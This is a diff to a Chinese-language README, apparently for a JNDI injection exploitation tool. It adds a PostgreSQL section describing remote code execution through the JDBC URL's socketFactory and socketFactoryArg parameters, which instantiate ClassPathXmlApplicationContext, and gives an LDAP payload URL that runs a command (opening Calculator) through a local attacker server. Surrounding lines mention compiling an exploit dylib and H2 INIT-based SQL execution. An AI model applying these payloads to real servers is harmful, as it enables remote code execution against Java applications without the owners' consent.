@@ -142,6 +142,14 @@ gcc -shared -fPIC exp.c -o exp.dylib
 
 将以下 URL 中的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一
 
+#### PostgreSQL
+
+通过 PostgreSQL JDBC URL 的 socketFactory 和 socketFactoryArg 参数实例化 ClassPathXmlApplicationContext 实现 RCE
+
+```bash
+ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
+````
+
 #### H2
 
 通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句
